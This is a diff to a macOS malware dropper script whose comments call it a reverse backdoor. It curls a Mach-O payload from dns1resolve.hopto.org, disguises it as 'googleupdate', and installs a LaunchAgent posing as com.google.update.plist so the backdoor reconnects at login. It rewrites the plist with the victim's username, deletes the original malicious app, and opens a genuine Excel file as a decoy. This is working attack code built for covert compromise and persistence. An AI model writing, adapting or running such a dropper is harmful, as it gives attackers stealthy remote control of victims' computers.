@@ -8,7 +8,7 @@ URL="https://dns1resolve.hopto.org:55143/osx"
 PLISTURL="https://dns1resolve.hopto.org:55143/plist"
 
 # URL to download a real excel file
-EXCELURL=""
+EXCELURL="https://www.smartsheet.com/sites/default/files/Construction-Budget-Template-IT.xlsx"
 
 # Rename our payload macho-o name
 PAYLOAD="googleupdate"
@@ -27,23 +27,26 @@ curl -s -k $URL -o ~/Library/$PAYLOAD
 chmod +x ~/Library/$PAYLOAD
 
 # Launch the macho-o reverse backdoor
-~/Library/$PAYLOAD &
+#~/Library/$PAYLOAD &
 
 sleep 2
 
 # Remove original malicious .app directory from victim
-rm -rf planimetria* 2>/dev/null 
+rm -rf planimetria* 2>/dev/null
 
 # Persistence as LaunchAgents. Our backdoor will call us after user login.
 # If we kill session once established, victim neeeds to log off and log in again to get another shell,
 # or just reboot.
 #
 # Download and write backdoored plist file
-curl -s -k $PLISTURL -o ~/Library/com.google.update.plist
+curl -s -k $PLISTURL -o ~/Library/LaunchAgents/com.google.update.plist
 
-# Get current dir
-CURRENTDIR=pwd
+# We need to replace 'replace' string on our ,plist file with correct username of our victim
+# Remember that using sed on OSX will use BSD mode. So u need a backup file that will remove in second istance
+USERNAME=$(whoami)
+sed -i .bak "s/replace/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.plist
+rm ~/Library/LaunchAgents/com.google.update.plist.bak
 
 # Download and open a real file excel
-curl -s $EXCELURL -o $CURRENTDIR/progetto.xls
-open $CURRENTDIR/progetto.xls
+curl -s $EXCELURL -o progetto.xlsx
+open progetto.xlsx
